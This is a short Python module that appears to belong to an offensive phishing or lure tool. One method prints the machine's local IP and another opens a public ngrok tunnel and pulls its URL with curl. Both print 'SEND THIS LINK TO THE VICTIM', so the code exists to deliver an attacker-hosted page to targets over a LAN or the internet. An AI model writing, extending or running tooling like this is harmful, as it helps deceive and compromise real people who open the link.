import socket
import os
from pyngrok import ngrok, conf
from Core.Support import Font
conf.get_default().ngrok_path = "Tunnel/ngrok"


class Controller:
    
    @staticmethod
    def Local():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))
        host = s.getsockname()[0]
        print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "SEND THIS LINK TO THE VICTIM:")
        print("http://" + host)

    @staticmethod
    def Wan():
        print(Font.Color.WHITE + "\nSTARTING NGROK SERVER...")
        ngrok.connect(bind_tls=True)
        print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "SEND THIS LINK TO THE VICTIM:")
        os.system(
            "curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'")
